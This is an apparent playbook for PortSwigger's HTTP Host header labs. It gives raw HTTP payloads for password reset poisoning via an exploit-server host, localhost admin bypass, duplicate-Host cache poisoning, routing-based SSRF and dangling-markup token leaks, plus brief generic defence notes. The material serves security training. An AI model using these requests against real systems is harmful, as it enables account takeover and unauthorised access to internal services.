---
name: "HTTP Host Header Attacks — Deep Dive"
description: "Complete PortSwigger deep-dive with exact payloads for every lab variant including zero-day techniques"
domain: cybersecurity
subdomain: bug-hunting
version: "1.0.0"
category: "bug-hunting/deep-dive-labs"
tags: [portswigger, deep-dive, exploitation, zero-day, lab-solutions]
mitre_attack: ["T1557"]
tools: [burp-suite, curl, sqlmap, ffuf, python, hashcat, ysoserial]
difficulty: "advanced"
---

# HTTP Host Header Attacks — Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- BSCP certification prep
- Real-world bug bounty hunting
- Building exploitation chains
- Understanding bypass techniques

## Prerequisites
- Burp Suite Professional
- Burp Collaborator / interactsh
- Browser with proxy configured


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: Basic password reset poisoning 🟢 APPRENTICE
```http
POST /forgot-password HTTP/1.1
Host: EXPLOIT-SERVER

username=carlos
```
Reset link sent to carlos contains your Host → steal token from access log.
---

### Lab 2: Auth bypass 🟡 PRACTITIONER
```http
GET /admin HTTP/1.1
Host: localhost
```
---

### Lab 3: Ambiguous requests cache poison 🟡 PRACTITIONER
```http
GET / HTTP/1.1
Host: TARGET
Host: EXPLOIT-SERVER
```
Duplicate Host header — backend uses second, cache keys on first.
---

### Lab 4: Routing-based SSRF 🟡 PRACTITIONER
```http
GET /admin HTTP/1.1
Host: 192.168.0.§1§
```
Host header controls routing to internal backends. Scan for admin panel.
---

### Lab 5: SSRF via flawed parsing 🟡 PRACTITIONER
```http
GET https://TARGET/admin HTTP/1.1
Host: 192.168.0.1
```
Absolute URL in request line → some servers use Host header for routing instead.
---

### Lab 6: Connection state attack 🔴 EXPERT
First request: valid Host. Keep-alive → second request: `Host: 192.168.0.1`. Server reuses validated connection state.
---

### Lab 7: Dangling markup password reset 🔴 EXPERT
```http
Host: TARGET:arbitraryport/exploit-server.com/?
```
Password reset email contains truncated URL that leaks token to your server via dangling markup.
---


## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research
When standard technique fails:
1. Identify the filter/WAF
2. Fuzz with Burp Intruder custom wordlists
3. Search GitHub/Twitter for new bypasses
4. Chain with other vulns for escalation
5. Try encoding variants: URL, double-URL, unicode, hex


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |


## Output Format
```
Vulnerability Deep-Dive Report
==============================
Target Vector: [Endpoint]
Bypass Technique: [Explanation of bypass]
Payload Used: [Payload]
Impact Explanation: [Impact]
```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- [PortSwigger Labs](https://portswigger.net/web-security/all-labs)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
